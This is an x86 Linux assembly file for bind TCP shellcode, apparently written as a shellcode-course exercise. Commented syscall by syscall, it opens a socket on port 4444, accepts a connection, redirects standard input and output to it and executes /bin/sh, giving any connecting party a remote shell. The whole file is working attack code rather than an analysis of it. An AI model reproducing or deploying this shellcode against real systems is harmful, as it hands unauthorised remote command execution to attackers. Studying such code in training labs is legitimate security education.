; Description:  Bind TCP shellcode
; Author: Manuel Mancera (SLAE - 858)

global _start			

section .text
_start:
	; int socket(int domain, int type, int protocol);
	xor eax, eax
	xor ebx, ebx
	push eax		; protocol	- 0
	push 1			; type		- SOCK_STREAM,
	push 2			; dominio 	- AF_INET

	mov ecx, esp		; arguments
	mov bl, 1		; sys_socket
	mov al, 102		; systemcall
	int 0x80

	mov esi, eax		; save sockfd


	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	xor eax, eax
	xor ecx, ecx
	; *addr
	push eax		; addr
	push word 0x5c11	; Port 4444
	push word 2		; PF_INET
	mov ecx, esp		; save *addr in ecx
	
	push 0x10		; length addrlen=16
	push ecx		; &serv_addr
	push esi		; sockfd

	mov ecx, esp		; arguments
	mov al, 102		; systemcall
	mov bl, 2		; sys_bind
	int 0x80

	; int listen(int sockfd, int backlog);
	xor eax, eax
	push eax		; backlog
	push esi		; sockfd
	
	mov ecx, esp		; save arguments
	mov bl, 4		; sys_listen
	mov al, 102		; socket syscall
	int 0x80

	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	xor eax, eax
	push eax		; null
	push eax		; null
	push esi		; sockfd

	mov ecx, esp		; save arguments
	mov bl, 5		; sys_accept 
	mov al, 102		; socket syscall
	int 0x80

	; int dup2(int oldfd, int newfd);	
	mov ebx, eax		; oldfd = clientfd, eax es clientfd, resultado de accept
	xor ecx, ecx            ; ecx = newfd      
loop:
    	mov al, 0x3f           	; syscall dup2    
    	int 0x80
	inc ecx			
    	cmp ecx, 0x2
    	jle loop


	; execve stack-sh
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80	
